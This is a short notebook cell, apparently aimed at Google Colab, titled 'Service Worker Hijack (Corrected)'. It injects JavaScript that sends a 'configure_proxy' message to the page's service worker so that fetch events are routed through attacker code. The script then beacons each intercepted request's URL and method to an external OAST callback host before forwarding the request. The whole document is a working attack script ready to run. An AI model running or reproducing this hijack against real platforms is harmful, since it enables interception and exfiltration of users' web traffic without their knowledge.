# Service Worker Hijack (Corrected)

**Run the cell below.** It will hijack the service worker and send a test HTTP request.
Check your Oast server for `START`, `SW_HIJACKED`, and `FETCH` beacons.

In [ ]:
from IPython.display import display, Javascript
import requests
import time

# Inject the service worker hijack (JavaScript will execute now)
display(Javascript("\n(function() {\n    const OAST = 'https://3lpv9gwt1zmwxwbu5hnbw0ckdutp48vv8.oast.site';\n    new Image().src = OAST + '/START';\n\n    function hijack() {\n        if (!navigator.serviceWorker) {\n            new Image().src = OAST + '/ERROR?msg=no_sw';\n            return;\n        }\n        navigator.serviceWorker.ready.then(reg => {\n            const sw = reg.active;\n            if (!sw) {\n                setTimeout(hijack, 500);\n                return;\n            }\n            // Create two message channels: one for fetch events, one for responses\n            const fetchChannel = new MessageChannel();\n            const responseChannel = new MessageChannel();\n            const fetchPort = fetchChannel.port1;\n            const responsePort = responseChannel.port1;\n\n            // Listen for fetch events on fetchPort\n            fetchPort.onmessage = async (e) => {\n                const d = e.data;\n                if (d.action !== 'fetch') return;\n                // Exfiltrate request\n                new Image().src = OAST + '/FETCH?url=' + encodeURIComponent(d.url) + '&method=' + d.method;\n                // Forward to real network\n                try {\n                    const res = await fetch(d.url, { method: d.method, headers: d.headers, body: d.body });\n                    const data = await res.arrayBuffer();\n                    const headers = {};\n                    for (let [k,v] of res.headers.entries()) headers[k] = v;\n                    fetchPort.postMessage({\n                        action: 'response',\n                        responseId: d.requestId,\n                        response: { status: res.status, statusText: res.statusText, headers: headers, data: data }\n                    });\n                } catch(err) {\n                    fetchPort.postMessage({\n                        action: 'response',\n                        responseId: d.requestId,\n                        error: err.toString()\n                    });\n                }\n            };\n\n            // Listen for configuration confirmation on responsePort\n            responsePort.onmessage = (e) => {\n                if (e.data && e.data.configured) {\n                    console.log('%c\u2705 Service worker proxy configured', 'color:green');\n                    new Image().src = OAST + '/SW_HIJACKED';\n                    // Add green dot indicator\n                    let dot = document.getElementById('sw-dot');\n                    if (!dot) {\n                        dot = document.createElement('div');\n                        dot.id = 'sw-dot';\n                        dot.style.cssText = 'position:fixed;bottom:10px;right:10px;width:12px;height:12px;background:#0f0;border-radius:50%;z-index:999999;';\n                        document.body.appendChild(dot);\n                    }\n                }\n            };\n\n            // Send configure_proxy message with both ports\n            sw.postMessage({\n                action: 'configure_proxy',\n                serviceWorkerPort: fetchPort,\n                responsePort: responsePort\n            }, [fetchPort, responsePort]);\n        }).catch(e => new Image().src = OAST + '/ERROR?msg=' + encodeURIComponent(e.toString()));\n    }\n\n    hijack();\n})();\n"))
print('✅ Hijack script injected. Waiting 3 seconds for configuration...')
time.sleep(3)

# Make a test request – this should be intercepted
print('📡 Sending test request to https://httpbin.org/get...')
r = requests.get('https://httpbin.org/get', params={'verify': 'colab_sw_hijack_corrected'})
print(f'Response status: {r.status_code}')
print('✅ Test completed. Check your Oast server for /FETCH beacon with this request.')
